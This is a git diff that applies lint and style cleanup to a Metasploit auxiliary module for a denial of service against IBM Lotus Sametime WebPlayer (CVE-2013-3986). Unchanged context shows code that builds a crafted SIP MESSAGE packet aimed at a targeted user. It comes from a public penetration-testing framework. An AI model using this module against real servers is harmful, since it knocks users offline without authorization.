@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,74 +7,71 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'       => 'IBM Lotus Sametime WebPlayer DoS',
-      'Description'  => %q{
-        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
-        version 8.5.2.1392 (and prior) to cause a denial of service condition
-        against specific users. For this module to function the target user
-        must be actively logged into the IBM Lotus Sametime server and have
-        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
-        browser extension. The user should have the WebPlayer plug-in active
-        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
-      },
-      'Author'     =>
-        [
-          'Chris John Riley', # Vulnerability discovery
-          'kicks4kittens' # Metasploit module
-        ],
-      'License'    => MSF_LICENSE,
-      'Actions'    =>
-        [
-          ['DOS',
-            {
-              'Description' => 'Cause a Denial Of Service condition against a connected user'
-            }
-          ],
-          ['CHECK',
-            {
-              'Description' => 'Checking if targeted user is online'
-            }
-          ]
-        ],
-      'DefaultAction'  => 'DOS',
-      'References'   =>
-        [
-          [ 'CVE', '2013-3986' ],
-          [ 'OSVDB', '99552' ],
-          [ 'BID', '63611'],
-          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
-          [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
-        ],
-      'DisclosureDate' => 'Nov 07 2013'))
+                      'Name' => 'IBM Lotus Sametime WebPlayer DoS',
+                      'Description' => %q{
+                        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
+                        version 8.5.2.1392 (and prior) to cause a denial of service condition
+                        against specific users. For this module to function the target user
+                        must be actively logged into the IBM Lotus Sametime server and have
+                        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
+                        browser extension. The user should have the WebPlayer plug-in active
+                        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
+                      },
+                      'Author'     =>
+                        [
+                          'Chris John Riley', # Vulnerability discovery
+                          'kicks4kittens' # Metasploit module
+                        ],
+                      'License'    => MSF_LICENSE,
+                      'Actions'    =>
+                        [
+                          ['DOS',
+                           {
+                             'Description' => 'Cause a Denial Of Service condition against a connected user'
+                           }],
+                          ['CHECK',
+                           {
+                             'Description' => 'Checking if targeted user is online'
+                           }]
+                        ],
+                      'DefaultAction' => 'DOS',
+                      'References' =>
+                        [
+                          [ 'CVE', '2013-3986' ],
+                          [ 'OSVDB', '99552' ],
+                          [ 'BID', '63611'],
+                          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
+                          [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
+                        ],
+                      'DisclosureDate' => 'Nov 07 2013'))
 
     register_options(
       [
         Opt::RPORT(5060),
         OptAddress.new('RHOST', [true, 'The Sametime Media Server']),
         OptString.new('SIPURI', [
-          true,
-          'The SIP URI of the user to be targeted',
-          '<target_email_address>@<sametime_media_server_FQDN>'
-        ]),
-        OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
-      ], self.class)
-
+                        true,
+                        'The SIP URI of the user to be targeted',
+                        '<target_email_address>@<sametime_media_server_FQDN>'
+                      ]),
+        OptInt.new('TIMEOUT', [ true, 'Set specific response timeout', 0])
+      ], self.class
+    )
   end
 
   def setup
     # cleanup SIP target to ensure it's in the correct format to use
     @sipuri = datastore['SIPURI']
-    if @sipuri[0, 4].downcase == "sip:"
+    if @sipuri[0, 4].casecmp("sip:").zero?
       # remove sip: if present in string
       @sipuri = @sipuri[4, @sipuri.length]
     end
-    if @sipuri[0, 12].downcase == "webavclient-"
+    if @sipuri[0, 12].casecmp("webavclient-").zero?
       # remove WebAVClient- if present in string
       @sipuri = @sipuri[12, @sipuri.length]
     end
@@ -113,7 +111,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error("User is still online")
     end
-
   end
 
   def dos_user
@@ -171,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     # create SIP MESSAGE of specified length
     vprint_status("Creating SIP MESSAGE packet #{length} bytes long")
 
-    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
+    source_user = Rex::Text.rand_text_alphanumeric(rand(8) + 1)
     source_host = Rex::Socket.source_address(datastore['RHOST'])
     src = "#{source_host}:#{datastore['RPORT']}"
     cseq = Rex::Text.rand_text_numeric(3)
@@ -180,7 +177,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # setup SIP message in the correct format expected by the server
     data =  "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
-    data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
+    data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{'%.8x' % rand(0x100000000)};rport;alias" + "\r\n"
     data << "Max-Forwards: 80\r\n"
     data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
     data << "From: sip:#{source_user}@#{src};tag=70c00e8c" + "\r\n"
@@ -191,14 +188,14 @@ class MetasploitModule < Msf::Auxiliary
     data << "Content-Length: #{message_text.length}" + "\r\n\r\n"
     data << message_text
 
-    return data
+    data
   end
 
   def timing_get_once(s, length)
-    if datastore['TIMEOUT'] and datastore['TIMEOUT'] > 0
-      return s.get_once(length, datastore['TIMEOUT'])
+    if datastore['TIMEOUT'] && datastore['TIMEOUT'] > 0
+      s.get_once(length, datastore['TIMEOUT'])
     else
-      return s.get_once(length)
+      s.get_once(length)
     end
   end
 
@@ -206,7 +203,11 @@ class MetasploitModule < Msf::Auxiliary
     begin
       s = connect
       # send message and store response
-      s.put(msg + "\r\n\r\n") rescue nil
+      begin
+        s.put(msg + "\r\n\r\n")
+      rescue
+        nil
+      end
       # read response
       res = timing_get_once(s, 25)
       if res == "\r\n"
